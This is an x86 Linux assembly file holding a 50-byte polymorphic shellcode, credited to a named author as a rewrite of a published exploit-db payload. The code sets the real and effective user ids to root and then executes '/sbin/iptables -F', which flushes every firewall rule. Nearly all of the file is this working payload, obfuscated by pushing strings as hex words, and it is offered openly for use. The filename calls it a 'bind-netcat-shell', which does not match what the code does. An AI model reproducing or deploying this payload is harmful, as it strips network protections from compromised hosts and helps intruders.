; Filename: bind-netcat-shell.nasm
; Author:  Juanma Reyes
; Website:  jmreyes.net
;
; Linux x86 Bind iptables Flush shellcode (50 bytes) 
; Polymorphic version of https://www.exploit-db.com/exploits/43708/

global _start			

section .text
_start:
	push 0x46
	pop eax		; EAX = 0x46 (syscall setreuid() is selected)
	xor ebx, ebx
	xor ecx, ecx
	int 0x80
	
	push ecx
	push word 0x7365 ; 'es' -> Saving one byte by using push word!
	push 0x6C626174 ; 'tabl'
	push 0x70692F6E ; 'n/ip'
	push 0x6962732F ; '/sbi'
	mov ebx, esp	; EBX points to '/sbin/iptables'

	push ecx
	push word 0x462D ; '-F'
	mov edi, esp	; EDI points to '-F'
	
	push ecx
	push edi
	push ebx
	mov ecx, esp	; ECX points to the array of arguments

	push 0xb
	pop eax		; EAX = 0xb (syscall execve() is selected)
	int 0x80
	
	; EAX is already 0 at this point, so exit() syscall is selected
	int 0x80
